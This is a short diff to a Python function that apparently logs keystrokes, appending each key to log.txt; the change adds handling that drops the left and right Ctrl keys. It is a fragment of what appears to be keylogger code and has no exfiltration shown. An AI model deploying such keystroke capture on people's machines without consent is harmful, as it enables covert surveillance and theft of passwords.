@@ -5,6 +5,10 @@ def writeFile(key):
     keyval=keyval.replace("'","")
     if keyval == 'Key.space':
         keyval=' ' 
+    if keyval == 'Key.ctrl_r':
+        keyval = ''
+    if keyval == 'Key.ctrl_l':
+        keyval = ''
     with open("log.txt", 'a') as f:
         f.write(keyval)
 
